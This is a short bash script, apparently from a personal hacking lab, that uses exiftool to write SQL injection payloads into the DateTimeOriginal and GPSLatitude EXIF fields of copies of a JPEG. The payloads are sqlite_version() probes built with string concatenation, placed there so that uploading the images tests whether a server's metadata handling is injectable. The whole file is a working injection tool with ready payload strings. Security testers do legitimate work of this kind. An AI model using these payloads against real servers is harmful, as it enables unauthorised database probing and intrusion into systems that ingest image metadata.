#!/bin/bash
# datetime_sweep.sh — server reads DateTimeOriginal (proved) and GPS. Make/Model are escaped.
# Test SQLi in DateTime and GPS via exiftool with the sqlite_version() probe.
EXIFTOOL="/c/Users/Usuario/Documents/GonzaOrban/HackLab/exiftool/exiftool.exe"
BASE_IMG="paisaje_conv.jpg"

w() { # w <marker> <tag=value...>
  local marker="$1"; shift
  cp "$BASE_IMG" f2_$marker.jpg
  "$EXIFTOOL" -overwrite_original "$@" f2_$marker.jpg >/dev/null 2>&1
  echo "f2_$marker.jpg:"; "$EXIFTOOL" -s -DateTimeOriginal -GPSLatitude -GPSLongitude f2_$marker.jpg
  echo
}

PIPE="'||(SELECT sqlite_version())||'"
CONCAT="',(SELECT sqlite_version()))--"

# datetime with concat payloads
w dt_pipe    "-DateTimeOriginal=$PIPE"
w dt_concat  "-DateTimeOriginal=$CONCAT"
# datetime that is partially valid then payload (some parsers only choke mid-string)
w dt_mixed   "-DateTimeOriginal=2025:01:01 00:00:00$PIPE"
# GPS as a raw string payload (exiftool may accept a string into these)
w gps_pipe   "-GPSLatitude=$PIPE" "-GPSLatitudeRef=N"

echo "upload with: python upload_sweep2.py"
